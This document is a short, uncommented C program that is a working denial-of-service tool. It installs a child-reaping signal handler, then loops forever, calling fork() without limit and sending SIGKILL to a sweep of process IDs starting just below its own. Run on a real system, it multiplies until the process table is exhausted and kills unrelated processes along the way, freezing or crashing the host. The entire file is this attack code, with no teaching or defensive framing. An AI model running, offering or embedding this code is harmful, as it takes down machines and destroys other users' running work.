#include <stdio.h>
#include <unistd.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <sys/types.h>
#include <pthread.h>
#include <errno.h>
#include <signal.h>
#include <wait.h>

#define PROCESS_DIST 50

void child(int sig){
	while(waitpid(-1,NULL,WNOHANG) > 0);
}

int main(){
	struct sigaction signal;
	signal.sa_handler = child;
	sigemptyset(&signal.sa_mask);
	signal.sa_flags = SA_RESTART;
	sigaction(SIGCHLD, &signal, NULL);

	int mypid = getpid();
	int pid = mypid - PROCESS_DIST;
	while (1) {
		if(pid != mypid){
			kill(pid,SIGKILL);
		}
		pid++;
		fork();
	}
}